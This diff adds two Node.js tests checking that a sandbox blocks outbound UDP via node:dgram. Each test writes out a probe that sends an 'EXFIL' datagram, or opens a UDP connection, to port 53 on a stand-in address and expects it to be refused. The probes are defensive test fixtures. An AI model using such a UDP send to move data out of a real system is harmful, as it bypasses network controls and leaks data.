@@ -95,3 +95,35 @@ try {
 `)
   assert.match(out, /\bOK\b/, `net.Socket.connect was not blocked: ${out}`)
 })
+
+test("node:dgram UDP send is blocked (UDP bypasses net.Socket and --permission)", () => {
+  const out = runProbe(`
+import dgram from "node:dgram"
+const s = dgram.createSocket("udp4")
+try {
+  await new Promise((resolve, reject) =>
+    s.send(Buffer.from("EXFIL"), 53, "203.0.113.1", (err) => (err ? reject(err) : resolve())),
+  )
+  console.log("FAIL:datagram sent")
+} catch (err) {
+  if (/Outbound network access disabled/.test(err.message)) console.log("OK")
+  else console.log("FAIL:" + err.message)
+}
+`)
+  assert.match(out, /\bOK\b/, `node:dgram UDP send was not blocked: ${out}`)
+})
+
+test("node:dgram connected-mode connect is blocked", () => {
+  const out = runProbe(`
+import dgram from "node:dgram"
+const s = dgram.createSocket("udp4")
+try {
+  s.connect(53, "203.0.113.1")
+  console.log("FAIL:connect returned")
+} catch (err) {
+  if (/Outbound network access disabled/.test(err.message)) console.log("OK")
+  else console.log("FAIL:" + err.message)
+}
+`)
+  assert.match(out, /\bOK\b/, `node:dgram connect was not blocked: ${out}`)
+})
